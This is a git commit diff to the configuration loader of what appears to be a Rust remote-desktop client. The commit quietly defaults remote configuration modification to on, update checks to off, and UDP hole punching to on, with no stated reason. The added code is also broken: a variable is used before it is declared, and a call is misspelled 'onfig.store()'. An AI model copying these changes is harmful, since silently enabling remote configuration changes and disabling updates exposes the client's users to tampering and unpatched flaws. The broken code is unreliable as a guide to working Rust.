a41fe6e3a4821e00cdf7193942911ecc03b3be3b
“474893496” <474893496@qq.com>
2026-01-18 00:04:30 +0800

    设置主题打洞等等

--- src/config.rs
+++ src/config.rs
@@ -458,6 +458,12 @@ fn patch(path: PathBuf) -> PathBuf {
 impl Config2 {
     fn load() -> Config2 {
         let mut config = Config::load_::<Config2>("2");
+
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+
         let mut store = false;
         if let Some(mut socks) = config.socks {
             let (password, _, store2) =
@@ -1819,7 +1825,29 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+
+    if !config.options.contains_key("enable-check-update") {
+        config.options.insert("enable-check-update".to_string(), "N".to_string());
+        store = true;
+    }
+
+    if !config.options.contains_key("theme") {
+        config.options.insert("theme".to_string(), "dark".to_string());
+        store = true;
+    }
+
+        let mut store = false;
+    
+    if !config.options.contains_key("enable-udp-punch") {
+        config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+        store = true;
+    }
+    
+    if store {
+      onfig.store();
+    }
+    config
     }
 
     fn store(&self) {
